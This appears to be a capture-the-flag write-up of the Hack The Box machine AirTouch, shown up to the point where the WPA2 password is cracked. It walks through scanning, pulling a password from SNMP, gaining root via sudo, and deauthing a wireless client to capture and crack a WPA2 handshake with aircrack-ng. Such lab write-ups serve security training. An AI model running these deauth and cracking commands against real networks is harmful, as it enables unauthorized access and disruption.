---
maquina: "AirTouch"
dificultad: "Medium"
os: "Linux"
plataforma: "htb"
release: "17 Jan 2026"
retire: "18 Apr 2026"
creadores: "r4ulcl"
htb_url: "https://hackthebox.com/machines/airtouch"
app_url: "https://app.hackthebox.com/machines/823"
url: "https://0xdf.gitlab.io/2026/04/18/htb-airtouch.html"
tipo: "htb"
en_lista_oscp: false
oscp_seccion: ""
---

AirTouch simulates a wireless network environment. I’ll start by pulling a default password from SNMP to SSH as a consultant user inside a container with virtual wireless interfaces. From there, I’ll capture and crack a WPA2-PSK handshake to join the tablet network, then decrypt the captured traffic in WireShark to recover session cookies for a router management site. A client-side role cookie gates an admin upload feature, where I’ll bypass the PHP extension filter with a phtml file to get RCE. Hardcoded credentials in the source give me the next user, and sudo gets me root, where I find the CA and server certs for the corporate wireless network. I’ll use those with eaphammer to stand up an evil twin of AirTouch-Office and capture a PEAP-MSCHAPv2 challenge, which cracks to reveal a user’s password. That gets me onto the corporate network, where a hostapd eap_user file leaks an admin password, and sudo gets me to root.

## Recon

### TCP Scanning

`nmap` finds only one open TCP port, SSH (22):

```console
oxdf@hacky$ sudo nmap -p- -vvv --min-rate 10000 10.129.244.98
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-04-11 05:07 UTC
...[snip]...
Nmap scan report for 10.129.244.98
Host is up, received reset ttl 63 (0.025s latency).
Scanned at 2026-04-11 05:07:23 UTC for 7s
Not shown: 65534 closed tcp ports (reset)
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 62

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 7.14 seconds
           Raw packets sent: 69959 (3.078MB) | Rcvd: 65536 (2.621MB)
oxdf@hacky$ sudo nmap -p 22 -sCV 10.129.244.98
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-04-11 05:07 UTC
Nmap scan report for 10.129.244.98
Host is up (0.022s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 bd:90:00:15:cf:4b:da:cb:c9:24:05:2b:01:ac:dc:3b (RSA)
|   256 6e:e2:44:70:3c:6b:00:57:16:66:2f:37:58:be:f5:c0 (ECDSA)
|_  256 ad:d5:d5:f0:0b:af:b2:11:67:5b:07:5c:8e:85:76:76 (ED25519)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 1.24 seconds
```

Based on the [OpenSSH version](https://0xdf.gitlab.io/cheatsheets/os#ubuntu), the host is likely running Ubuntu focal 20.04 LTS (or perhaps Ubuntu groovy 10.10).

The TTL shows 62, which is one less than I would [expect](https://0xdf.gitlab.io/cheatsheets/os#os-identification) for Linux one hop away. This implies I may be interacting with a container or VM.

### UDP Scanning

I’ve always disliked `nmap` UDP scans, as they are slow and hard to interpret. UDP is tricky because there is no handshake like there is with TCP, so determining if a port is open can involve sending valid data of the protocol being served, not just starting a connection.

An `nmap` scan on the top 1000 ports took over 36 minutes:

```console
oxdf@hacky$ sudo nmap -sU -sC --min-rate 10000 10.129.244.98
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-04-11 05:17 UTC
Nmap scan report for 10.129.244.98
Host is up (0.024s latency).
Not shown: 993 open|filtered udp ports (no-response)
PORT      STATE  SERVICE
161/udp   open   snmp
| snmp-info:
|   enterprise: net-snmp
|   engineIDFormat: unknown
|   engineIDData: 7dee5d68b649d96900000000
|   snmpEngineBoots: 1
|_  snmpEngineTime: 3h12m45s
| snmp-sysdescr: "The default consultant password is: RxBlZhLmOkacNWScmZ6D (change it after use it)"
|_  System uptime: 3h12m45.44s (1156544 timeticks)
1057/udp  closed startron
3456/udp  closed IISrpc-or-vat
9001/udp  closed etlservicemgr
18869/udp closed unknown
49198/udp closed unknown
49396/udp closed unknown

Nmap done: 1 IP address (1 host up) scanned in 2168.27 seconds
```

It does identify a handful of ports as “closed” (a packet came back to indicate the port was closed, rather than just no response), and finds SNMP open on 161.

`masscan` only takes a couple minutes, but finds nothing:

```console
oxdf@hacky$ sudo masscan -pU:1-65535 --rate 1000 10.129.244.98
Starting masscan 1.3.2 (http://bit.ly/14GZzcT) at 2026-04-11 20:42:54 GMT
Initiating SYN Stealth Scan
Scanning 1 hosts [65535 ports/host]
```

I’ll give [UDPX](https://github.com/nullt3r/udpx) a try. It checks over 45 common UDP ports using protocol specific payloads designed to get a response. It installs with `go install -v github.com/nullt3r/udpx/cmd/udpx@latest`, and identifies SNMP in less than 30 seconds:

```console
oxdf@hacky$ udpx -t 10.129.244.98

        __  ______  ____ _  __
       / / / / __ \/ __ \ |/ /
      / / / / / / / /_/ /   /
     / /_/ / /_/ / ____/   |
     \____/_____/_/   /_/|_|
         v1.0.7, by @nullt3r

2026/04/11 07:05:53 [+] Starting UDP scan on 1 target(s)
2026/04/11 07:06:01 [*] 10.129.244.98:161 (snmp)
2026/04/11 07:06:17 [+] Scan completed
```

### SNMP - UDP 161

The `nmap` script output already shows an interesting system description: “The default consultant password is: RxBlZhLmOkacNWScmZ6D (change it after use it)”.

A tool like [onesixtyone](https://github.com/trailofbits/onesixtyone) will brute force the SNMP community string:

```console
oxdf@hacky$ onesixtyone -c /opt/SecLists/Discovery/SNMP/snmp.txt 10.129.244.98
Scanning 1 hosts, 3219 communities
10.129.244.98 [public] "The default consultant password is: RxBlZhLmOkacNWScmZ6D (change it after use it)"
10.129.244.98 [public] "The default consultant password is: RxBlZhLmOkacNWScmZ6D (change it after use it)"
```

I can also guess that “public” will work for information that’s meant to be accessed without auth.

`snmpwalk` will dump the entire SNMP information:

```console
oxdf@hacky$ snmpwalk -v 2c -c public 10.129.244.98
SNMPv2-MIB::sysDescr.0 = STRING: "The default consultant password is: RxBlZhLmOkacNWScmZ6D (change it after use it)"
SNMPv2-MIB::sysObjectID.0 = OID: NET-SNMP-MIB::netSnmpAgentOIDs.10
DISMAN-EVENT-MIB::sysUpTimeInstance = Timeticks: (6802958) 18:53:49.58
SNMPv2-MIB::sysContact.0 = STRING: admin@AirTouch.htb
SNMPv2-MIB::sysName.0 = STRING: Consultant
SNMPv2-MIB::sysLocation.0 = STRING: "Consultant pc"
SNMPv2-MIB::sysORLastChange.0 = Timeticks: (0) 0:00:00.00
SNMPv2-MIB::sysORID.1 = OID: SNMP-FRAMEWORK-MIB::snmpFrameworkMIBCompliance
SNMPv2-MIB::sysORID.2 = OID: SNMP-MPD-MIB::snmpMPDCompliance
SNMPv2-MIB::sysORID.3 = OID: SNMP-USER-BASED-SM-MIB::usmMIBCompliance
SNMPv2-MIB::sysORID.4 = OID: SNMPv2-MIB::snmpMIB
SNMPv2-MIB::sysORID.5 = OID: SNMP-VIEW-BASED-ACM-MIB::vacmBasicGroup
SNMPv2-MIB::sysORID.6 = OID: TCP-MIB::tcpMIB
SNMPv2-MIB::sysORID.7 = OID: IP-MIB::ip
SNMPv2-MIB::sysORID.8 = OID: UDP-MIB::udpMIB
SNMPv2-MIB::sysORID.9 = OID: SNMP-NOTIFICATION-MIB::snmpNotifyFullCompliance
SNMPv2-MIB::sysORID.10 = OID: NOTIFICATION-LOG-MIB::notificationLogMIB
SNMPv2-MIB::sysORDescr.1 = STRING: The SNMP Management Architecture MIB.
SNMPv2-MIB::sysORDescr.2 = STRING: The MIB for Message Processing and Dispatching.
SNMPv2-MIB::sysORDescr.3 = STRING: The management information definitions for the SNMP User-based Security Model.
SNMPv2-MIB::sysORDescr.4 = STRING: The MIB module for SNMPv2 entities
SNMPv2-MIB::sysORDescr.5 = STRING: View-based Access Control Model for SNMP.
SNMPv2-MIB::sysORDescr.6 = STRING: The MIB module for managing TCP implementations
SNMPv2-MIB::sysORDescr.7 = STRING: The MIB module for managing IP and ICMP implementations
SNMPv2-MIB::sysORDescr.8 = STRING: The MIB module for managing UDP implementations
SNMPv2-MIB::sysORDescr.9 = STRING: The MIB modules for managing SNMP Notification, plus filtering.
SNMPv2-MIB::sysORDescr.10 = STRING: The MIB module for logging SNMP Notifications.
SNMPv2-MIB::sysORUpTime.1 = Timeticks: (0) 0:00:00.00
SNMPv2-MIB::sysORUpTime.2 = Timeticks: (0) 0:00:00.00
SNMPv2-MIB::sysORUpTime.3 = Timeticks: (0) 0:00:00.00
SNMPv2-MIB::sysORUpTime.4 = Timeticks: (0) 0:00:00.00
SNMPv2-MIB::sysORUpTime.5 = Timeticks: (0) 0:00:00.00
SNMPv2-MIB::sysORUpTime.6 = Timeticks: (0) 0:00:00.00
SNMPv2-MIB::sysORUpTime.7 = Timeticks: (0) 0:00:00.00
SNMPv2-MIB::sysORUpTime.8 = Timeticks: (0) 0:00:00.00
SNMPv2-MIB::sysORUpTime.9 = Timeticks: (0) 0:00:00.00
SNMPv2-MIB::sysORUpTime.10 = Timeticks: (0) 0:00:00.00
HOST-RESOURCES-MIB::hrSystemUptime.0 = Timeticks: (6810149) 18:55:01.49
HOST-RESOURCES-MIB::hrSystemUptime.0 = No more variables left in this MIB View (It is past the end of the MIB tree)
```

The description is the only interesting bit here.

## Shell as root@AirTouch-Consultant

### SSH as consultant

I’ll use the password from SNMP to get a shell with SSH as the consultant user:

```console
oxdf@hacky$ sshpass -p RxBlZhLmOkacNWScmZ6D ssh consultant@10.129.244.98
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-216-generic x86_64)
...[snip]...
consultant@AirTouch-Consultant:~$
```

The host is Ubuntu 20.04 as predicted.

### User Enumeration

The consultant user is the only user with a home directory in `/home`:

```console
consultant@AirTouch-Consultant:~$ ls /home/
consultant
```

This matches with users with shells configured in `passwd`:

```console
consultant@AirTouch-Consultant:~$ cat /etc/passwd | grep 'sh$'
root:x:0:0:root:/root:/bin/bash
consultant:x:1000:1000::/home/consultant:/bin/bash
```

The consultant user’s home directory is empty other than two images:

```console
consultant@AirTouch-Consultant:~$ find . -type f
./.bashrc
./.profile
./.bash_logout
./.cache/motd.legal-displayed
./diagram-net.png
./photo_2023-03-01_22-04-52.png
```

I’ll grab each of these over `scp`:

```console
oxdf@hacky$ sshpass -p RxBlZhLmOkacNWScmZ6D scp consultant@10.129.244.98:~/*.png .
```

The two images from consultant’s home directory are network maps. The first is a hand-drawn diagram:

![imagen](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/photo_2023-03-01_22-04-52.png)

The second is a computer generated diagram laying out roughly the same architecture with more detail:

![imagen](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/diagram-net.png)

This also shows that SSH (TCP 22) and SNMP (UDP 161) are being forwarded to the Consultant Laptop on those same ports.

I’ll note the three subnets:

| VLAN | SSID | IPs |
|---|---|---|
| Consultant | N/A | 172.20.1.0/24 |
| Tablets | AirTouch-Internet | 192.168.3.0/24 |
| Corp | AirTouch-Office | 10.10.10.0/24 |

### sudo

consultant can run any command as root using `sudo`:

```console
consultant@AirTouch-Consultant:~$ sudo -l
Matching Defaults entries for consultant on AirTouch-Consultant:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User consultant may run the following commands on AirTouch-Consultant:
    (ALL) NOPASSWD: ALL
```

`sudo -i` gives a root shell:

```console
consultant@AirTouch-Consultant:~$ sudo -i
root@AirTouch-Consultant:~#
```

## Connection to AirTouch-Internet

### Enumeration

#### Home Directory

`/root` holds an interesting directory:

```console
root@AirTouch-Consultant:~# ls -a
.  ..  .bash_history  .bashrc  .cache  .profile  .wget-hsts  eaphammer
```

[eaphammer](https://github.com/s0lst1c3/eaphammer) is a tool for running targeted evil twin attacks against WPA2-Enterprise networks. The `.wget-hsts` file show contact with GitHub, likely downloading `eaphammer`:

```plaintext
# HSTS 1.0 Known Hosts database for GNU Wget.
# Edit at your own risk.
# <hostname>    <port>  <incl. subdomains>      <created>       <max-age>
raw.githubusercontent.com       0       0       1711555940      31536000
github.com      0       1       1711555935      31536000
codeload.github.com     0       0       1711555669      31536000
```

#### Network

`ip addr` shows 9 interfaces:

```console
root@AirTouch-Consultant:~# ip addr
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host
       valid_lft forever preferred_lft forever
2: eth0@if29: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default
    link/ether ea:9a:2d:5f:53:dc brd ff:ff:ff:ff:ff:ff link-netnsid 0
    inet 172.20.1.2/24 brd 172.20.1.255 scope global eth0
       valid_lft forever preferred_lft forever
7: wlan0: <BROADCAST,MULTICAST> mtu 1500 qdisc noop state DOWN group default qlen 1000
    link/ether 02:00:00:00:00:00 brd ff:ff:ff:ff:ff:ff
8: wlan1: <BROADCAST,MULTICAST> mtu 1500 qdisc noop state DOWN group default qlen 1000
    link/ether 02:00:00:00:01:00 brd ff:ff:ff:ff:ff:ff
9: wlan2: <BROADCAST,MULTICAST> mtu 1500 qdisc noop state DOWN group default qlen 1000
    link/ether 02:00:00:00:02:00 brd ff:ff:ff:ff:ff:ff
10: wlan3: <BROADCAST,MULTICAST> mtu 1500 qdisc noop state DOWN group default qlen 1000
    link/ether 02:00:00:00:03:00 brd ff:ff:ff:ff:ff:ff
11: wlan4: <BROADCAST,MULTICAST> mtu 1500 qdisc noop state DOWN group default qlen 1000
    link/ether 02:00:00:00:04:00 brd ff:ff:ff:ff:ff:ff
12: wlan5: <BROADCAST,MULTICAST> mtu 1500 qdisc noop state DOWN group default qlen 1000
    link/ether 02:00:00:00:05:00 brd ff:ff:ff:ff:ff:ff
13: wlan6: <BROADCAST,MULTICAST> mtu 1500 qdisc noop state DOWN group default qlen 1000
    link/ether 02:00:00:00:06:00 brd ff:ff:ff:ff:ff:ff
```

eth0 has the IP 172.20.1.2/24, which matches what Consultant Laptop has in the diagram.

`eth0@if29` means this is a veth (virtual ethernet) pair, so this is one end of a virtual network cable. “eth0” is the interface name inside this container, and “@if29” says that the other end of the veth pair is interface index 29 on the host. This confirms this shell is inside a container (Docker/LXC).

The seven wireless interfaces are all down.

I’ll bring up one of the wireless interfaces and scan for visible access points:

```console
root@AirTouch-Consultant:~# ip link set wlan0 up
root@AirTouch-Consultant:~# iwlist wlan0 scan
wlan0     Scan completed :
          Cell 01 - Address: 8A:68:3A:D6:EB:29
                    Channel:1
                    Frequency:2.412 GHz (Channel 1)
                    Quality=70/70  Signal level=-30 dBm
                    Encryption key:on
                    ESSID:"vodafoneFB6N"
                    Bit Rates:1 Mb/s; 2 Mb/s; 5.5 Mb/s; 11 Mb/s; 6 Mb/s
                              9 Mb/s; 12 Mb/s; 18 Mb/s
                    Bit Rates:24 Mb/s; 36 Mb/s; 48 Mb/s; 54 Mb/s
                    Mode:Master
                    Extra:tsf=00064f3104f435a4
                    Extra: Last beacon: 76ms ago
                    IE: Unknown: 000C766F6461666F6E654642364E
                    IE: Unknown: 010882848B960C121824
                    IE: Unknown: 030101
                    IE: Unknown: 2A0104
                    IE: Unknown: 32043048606C
                    IE: IEEE 802.11i/WPA2 Version 1
                        Group Cipher : TKIP
                        Pairwise Ciphers (1) : TKIP
                        Authentication Suites (1) : PSK
                    IE: Unknown: 3B025100
                    IE: Unknown: 7F080400400200000040
          Cell 02 - Address: 3E:16:E6:E4:3C:72
                    Channel:3
                    Frequency:2.422 GHz (Channel 3)
                    Quality=70/70  Signal level=-30 dBm
                    Encryption key:on
                    ESSID:"MOVISTAR_FG68"
                    Bit Rates:1 Mb/s; 2 Mb/s; 5.5 Mb/s; 11 Mb/s; 6 Mb/s
                              9 Mb/s; 12 Mb/s; 18 Mb/s
                    Bit Rates:24 Mb/s; 36 Mb/s; 48 Mb/s; 54 Mb/s
                    Mode:Master
                    Extra:tsf=00064f3104f62a6f
                    Extra: Last beacon: 76ms ago
                    IE: Unknown: 000D4D4F5649535441525F46473638
                    IE: Unknown: 010882848B960C121824
                    IE: Unknown: 030103
                    IE: Unknown: 2A0104
                    IE: Unknown: 32043048606C
                    IE: IEEE 802.11i/WPA2 Version 1
                        Group Cipher : TKIP
                        Pairwise Ciphers (2) : CCMP TKIP
                        Authentication Suites (1) : PSK
                    IE: Unknown: 3B025100
                    IE: Unknown: 7F080400400200000040
          Cell 03 - Address: 92:52:98:67:66:19
                    Channel:6
                    Frequency:2.437 GHz (Channel 6)
                    Quality=70/70  Signal level=-30 dBm
                    Encryption key:on
                    ESSID:"WIFI-JOHN"
                    Bit Rates:1 Mb/s; 2 Mb/s; 5.5 Mb/s; 11 Mb/s; 6 Mb/s
                              9 Mb/s; 12 Mb/s; 18 Mb/s
                    Bit Rates:24 Mb/s; 36 Mb/s; 48 Mb/s; 54 Mb/s
                    Mode:Master
                    Extra:tsf=00064f3104f927f1
                    Extra: Last beacon: 76ms ago
                    IE: Unknown: 0009574946492D4A4F484E
                    IE: Unknown: 010882848B960C121824
                    IE: Unknown: 030106
                    IE: Unknown: 2A0104
                    IE: Unknown: 32043048606C
                    IE: IEEE 802.11i/WPA2 Version 1
                        Group Cipher : TKIP
                        Pairwise Ciphers (2) : CCMP TKIP
                        Authentication Suites (1) : PSK
                    IE: Unknown: 3B025100
                    IE: Unknown: 7F080400400200000040
          Cell 04 - Address: F0:9F:C2:A3:F1:A7
                    Channel:6
                    Frequency:2.437 GHz (Channel 6)
                    Quality=70/70  Signal level=-30 dBm
                    Encryption key:on
                    ESSID:"AirTouch-Internet"
                    Bit Rates:1 Mb/s; 2 Mb/s; 5.5 Mb/s; 11 Mb/s; 6 Mb/s
                              9 Mb/s; 12 Mb/s; 18 Mb/s
                    Bit Rates:24 Mb/s; 36 Mb/s; 48 Mb/s; 54 Mb/s
                    Mode:Master
                    Extra:tsf=00064f3104f92ec5
                    Extra: Last beacon: 76ms ago
                    IE: Unknown: 0011416972546F7563682D496E7465726E6574
                    IE: Unknown: 010882848B960C121824
                    IE: Unknown: 030106
                    IE: Unknown: 2A0104
                    IE: Unknown: 32043048606C
                    IE: IEEE 802.11i/WPA2 Version 1
                        Group Cipher : TKIP
                        Pairwise Ciphers (2) : CCMP TKIP
                        Authentication Suites (1) : PSK
                    IE: Unknown: 3B025100
                    IE: Unknown: 7F080400400200000040
          Cell 05 - Address: F2:2A:26:A4:0B:29
                    Channel:9
                    Frequency:2.452 GHz (Channel 9)
                    Quality=70/70  Signal level=-30 dBm
                    Encryption key:on
                    ESSID:"MiFibra-24-D4VY"
                    Bit Rates:1 Mb/s; 2 Mb/s; 5.5 Mb/s; 11 Mb/s; 6 Mb/s
                              9 Mb/s; 12 Mb/s; 18 Mb/s
                    Bit Rates:24 Mb/s; 36 Mb/s; 48 Mb/s; 54 Mb/s
                    Mode:Master
                    Extra:tsf=00064f3104fc154d
                    Extra: Last beacon: 76ms ago
                    IE: Unknown: 000F4D6946696272612D32342D44345659
                    IE: Unknown: 010882848B960C121824
                    IE: Unknown: 030109
                    IE: Unknown: 2A0104
                    IE: Unknown: 32043048606C
                    IE: IEEE 802.11i/WPA2 Version 1
                        Group Cipher : CCMP
                        Pairwise Ciphers (1) : CCMP
                        Authentication Suites (1) : PSK
                    IE: Unknown: 3B025100
                    IE: Unknown: 7F080400400200000040
          Cell 06 - Address: AC:8B:A9:AA:3F:D2
                    Channel:44
                    Frequency:5.22 GHz (Channel 44)
                    Quality=70/70  Signal level=-30 dBm
                    Encryption key:on
                    ESSID:"AirTouch-Office"
                    Bit Rates:6 Mb/s; 9 Mb/s; 12 Mb/s; 18 Mb/s; 24 Mb/s
                              36 Mb/s; 48 Mb/s; 54 Mb/s
                    Mode:Master
                    Extra:tsf=00064f310502ea81
                    Extra: Last beacon: 76ms ago
                    IE: Unknown: 000F416972546F7563682D4F6666696365
                    IE: Unknown: 01088C129824B048606C
                    IE: Unknown: 03012C
                    IE: Unknown: 070A45532024041795060D00
                    IE: IEEE 802.11i/WPA2 Version 1
                        Group Cipher : CCMP
                        Pairwise Ciphers (1) : CCMP
                        Authentication Suites (1) : 802.1x
                    IE: Unknown: 3B027300
                    IE: Unknown: 7F080400400200000040
                    IE: Unknown: DD180050F2020101010003A4000027F7000043FF5E0067FF2F00
          Cell 07 - Address: AC:8B:A9:F3:A1:13
                    Channel:44
                    Frequency:5.22 GHz (Channel 44)
                    Quality=70/70  Signal level=-30 dBm
                    Encryption key:on
                    ESSID:"AirTouch-Office"
                    Bit Rates:6 Mb/s; 9 Mb/s; 12 Mb/s; 18 Mb/s; 24 Mb/s
                              36 Mb/s; 48 Mb/s; 54 Mb/s
                    Mode:Master
                    Extra:tsf=00064f310502eac0
                    Extra: Last beacon: 76ms ago
                    IE: Unknown: 000F416972546F7563682D4F6666696365
                    IE: Unknown: 01088C129824B048606C
                    IE: Unknown: 03012C
                    IE: Unknown: 070A45532024041795060D00
                    IE: IEEE 802.11i/WPA2 Version 1
                        Group Cipher : CCMP
                        Pairwise Ciphers (1) : CCMP
                        Authentication Suites (1) : 802.1x
                    IE: Unknown: 3B027300
                    IE: Unknown: 7F080400400200000040
                    IE: Unknown: DD180050F2020101010003A4000027F7000043FF5E0067FF2F00
```

It finds seven! I’ll use `grep` to get a nicer list:

```console
root@AirTouch-Consultant:/# iwlist wlan0 scan | grep -e ESSID -e Frequency -e Address
          Cell 01 - Address: 8A:68:3A:D6:EB:29
                    Frequency:2.412 GHz (Channel 1)
                    ESSID:"vodafoneFB6N"
          Cell 02 - Address: 3E:16:E6:E4:3C:72
                    Frequency:2.422 GHz (Channel 3)
                    ESSID:"MOVISTAR_FG68"
          Cell 03 - Address: 92:52:98:67:66:19
                    Frequency:2.437 GHz (Channel 6)
                    ESSID:"WIFI-JOHN"
          Cell 04 - Address: F0:9F:C2:A3:F1:A7
                    Frequency:2.437 GHz (Channel 6)
                    ESSID:"AirTouch-Internet"
          Cell 05 - Address: F2:2A:26:A4:0B:29
                    Frequency:2.452 GHz (Channel 9)
                    ESSID:"MiFibra-24-D4VY"
          Cell 06 - Address: AC:8B:A9:AA:3F:D2
                    Frequency:5.22 GHz (Channel 44)
                    ESSID:"AirTouch-Office"
          Cell 07 - Address: AC:8B:A9:F3:A1:13
                    Frequency:5.22 GHz (Channel 44)
                    ESSID:"AirTouch-Office"
```

4 is AirTouch-Internet, and 6 and 7 are APs for AirTouch-Office. The rest seem to be out of scope.

### WiFi Monitoring

The [aircrack-ng](https://www.aircrack-ng.org/) tools are installed on the host as well. I’ll use `airmon-ng` to put the wlan0 interface into monitor mode:

```console
root@AirTouch-Consultant:/# airmon-ng start wlan0
Your kernel has module support but you don't have modprobe installed.
It is highly recommended to install modprobe (typically from kmod).
Your kernel has module support but you don't have modinfo installed.
It is highly recommended to install modinfo (typically from kmod).
Warning: driver detection without modinfo may yield inaccurate results.

PHY     Interface       Driver          Chipset

phy0    wlan0           mac80211_hwsim  Software simulator of 802.11 radio(s) for mac80211

                (mac80211 monitor mode vif enabled for [phy0]wlan0 on [phy0]wlan0mon)
                (mac80211 station mode vif disabled for [phy0]wlan0)
phy1    wlan1           mac80211_hwsim  Software simulator of 802.11 radio(s) for mac80211
phy2    wlan2           mac80211_hwsim  Software simulator of 802.11 radio(s) for mac80211
phy3    wlan3           mac80211_hwsim  Software simulator of 802.11 radio(s) for mac80211
phy4    wlan4           mac80211_hwsim  Software simulator of 802.11 radio(s) for mac80211
phy5    wlan5           mac80211_hwsim  Software simulator of 802.11 radio(s) for mac80211
phy6    wlan6           mac80211_hwsim  Software simulator of 802.11 radio(s) for mac80211
```

This enabled that interface to passively listen to all wireless traffic on nearby channels, not just stuff addressed to this host.

I’ll run `airodump-ng wlan0mon -band abg` to start capturing traffic. By default, it only captures on 2.4 GHz channels. `--band abg` tells it to capture on 802.11a (5 GHz), 802.11b (2.4 GHz), and 802.11g (2.4 GHz).

```console
 CH  4 ][ Elapsed: 1 min ][ 2026-04-12 01:04

 BSSID              PWR  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID

 AC:8B:A9:F3:A1:13  -28       79        1    0  44   54e  WPA2 CCMP   MGT  AirTouch-Office
 AC:8B:A9:AA:3F:D2  -28       79        1    0  44   54e  WPA2 CCMP   MGT  AirTouch-Office
 F0:9F:C2:A3:F1:A7  -28       41        0    0   6   54        CCMP   PSK  AirTouch-Internet
 5E:C1:55:84:B8:82  -28       41        0    0   6   54        CCMP   PSK  WIFI-JOHN
 EE:A4:41:B9:58:7B  -28       39        0    0   9   54   WPA2 CCMP   PSK  MiFibra-24-D4VY
 26:64:F9:22:5C:4C  -28       78        0    0   3   54        CCMP   PSK  MOVISTAR_FG68
 AE:E8:96:04:55:48  -28     2330        0    0   1   54        TKIP   PSK  vodafoneFB6N

 BSSID              STATION            PWR   Rate    Lost    Frames  Notes  Probes

 AC:8B:A9:AA:3F:D2  28:6C:07:12:EE:F3  -29    0 - 1      0       12         AirTouch-Office
 AC:8B:A9:AA:3F:D2  C8:8A:9A:6F:F9:D2  -29    0 - 1e     0       19         AccessLink,AirTouch-Office
 (not associated)   28:6C:07:12:EE:A1  -29    0 - 1      4       12         AirTouch-Office
```

The top section shows the visible APs. There are six broadcasting SSIDs across seven access points, four using CCMP cipher with PSK auth, AirTouch-Office using CCMP cipher with MGT auth, and one using TKIP with PSK auth. The relevant ones are `AirTouch-Internet` (the tablets VLAN) on channel 6, and `AirTouch-Office` on channel 44. The others (`WIFI-JOHN`, `MiFibra-24-D4VY`, `MOVISTAR_FG68`, `vodafoneFB6N`) appear to be neighboring networks not part of this environment. The `AirTouch-Internet` access point has a MAC in the Ubiquiti range (F0:9F:C2).

It’s not important at this point, but `AirTouch-Office` doesn’t show up if I don’t scan the 5 GHz bands (channels 36, 40, 44, 48, etc).

The bottom section shows clients. One client (`28:6C:07:FE:A3:22`) is associated to `AirTouch-Internet`. Three other clients are not associated and are sending probe requests for `AirTouch-Office`. One of the clients (`C8:8A:9A:6F:F9:D2`) is also probing for `AccessLink`.

### Recover Password

#### Strategy

There are two possible attack paths from here:

1. Evil twin for AirTouch-Office - Three clients are actively probing for an AP that doesn’t exist, which seems like an ideal setup for an evil twin. However, initial attempts failed:
  - A WPA2-Enterprise (EAP) evil twin using `eaphammer` got zero connection attempts. This suggests the clients are not configured for EAP.
  - A WPA2-PSK evil twin using `hostapd-eaphammer` also got no connections. The clients may expect open auth, or there may be interference from `wlan0mon` channel-hopping on the same simulated radio while the rogue AP tries to serve on channel 6.
  - Since AirTouch-Office isn’t broadcasting, we don’t know its actual auth type, which makes it hard to match what the clients expect.
2. Crack AirTouch-Internet - This AP is visible, broadcasting on channel 6, using WPA2-CCMP PSK, and has an active client (`28:6C:07:FE:A3:22`). The attack is straightforward: deauth the client, capture the WPA2 4-way handshake when it reconnects, and crack the PSK offline. This gets us onto the Tablets VLAN.

I’ll come back to Evil Twin later, but for now I’ll focus on AirTouch-Internet.

#### Capture Authentication

I’ll run `airodump-ng wlan0mon --channel 6 --bssid F0:9F:C2:A3:F1:A7 -w /tmp/airtouch_capture` to drop into a collection state. In another terminal, I’ll use `aireplay-ng` to deauth the connected client:

```console
root@AirTouch-Consultant:~# aireplay-ng --deauth 5 -a F0:9F:C2:A3:F1:A7 -c 28:6C:07:FE:A3:22 wlan0mon
01:55:47  Waiting for beacon frame (BSSID: F0:9F:C2:A3:F1:A7) on channel 6
01:55:47  Sending 64 directed DeAuth (code 7). STMAC: [28:6C:07:FE:A3:22] [ 0| 0 ACKs]
01:55:48  Sending 64 directed DeAuth (code 7). STMAC: [28:6C:07:FE:A3:22] [ 0| 0 ACKs]
01:55:48  Sending 64 directed DeAuth (code 7). STMAC: [28:6C:07:FE:A3:22] [ 0| 0 ACKs]
01:55:49  Sending 64 directed DeAuth (code 7). STMAC: [28:6C:07:FE:A3:22] [ 0| 0 ACKs]
01:55:49  Sending 64 directed DeAuth (code 7). STMAC: [28:6C:07:FE:A3:22] [ 0| 0 ACKs]
```

It sends five bursts (from `--deauth 5`) of 64 deauth frames.

Now I can Ctrl-c the capture. In `/tmp` there’s a bunch of files related:

```console
root@AirTouch-Consultant:~# ls -l /tmp/airtouch_capture-01.*
-rw-r--r-- 1 root root  64933 Apr 12 01:56 /tmp/airtouch_capture-01.cap
-rw-r--r-- 1 root root    488 Apr 12 01:56 /tmp/airtouch_capture-01.csv
-rw-r--r-- 1 root root    596 Apr 12 01:56 /tmp/airtouch_capture-01.kismet.csv
-rw-r--r-- 1 root root   2707 Apr 12 01:56 /tmp/airtouch_capture-01.kismet.netxml
-rw-r--r-- 1 root root 253952 Apr 12 01:56 /tmp/airtouch_capture-01.log.csv
```

The `.cap` file is several KB, which means it has more than empty headers.

#### Crack

I’ll `scp` the capture back to my host:

```console
oxdf@hacky$ sshpass -p RxBlZhLmOkacNWScmZ6D scp consultant@10.129.244.98:/tmp/airtouch_capture-01.cap .
```

And use `aircrack-ng` with `rockyou.txt` to crack the PSK:

```console
oxdf@hacky$ aircrack-ng -w /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt  ./airtouch_capture-01.cap
Reading packets, please wait...
Opening ./airtouch_capture-01.cap
Read 1349 packets.

   #  BSSID              ESSID                     Encryption

   1  F0:9F:C2:A3:F1:A7  AirTouch-Internet         WPA (1 handshake)

Choosing first network as target.

Reading packets, please wait...
Opening ./airtouch_capture-01.cap
Read 1349 packets.

1 potential targets

                               Aircrack-ng 1.7

      [00:00:01] 21658/10303727 keys tested (35960.70 k/s)

      Time left: 4 minutes, 45 seconds                           0.21%

                           KEY FOUND! [ challenge ]

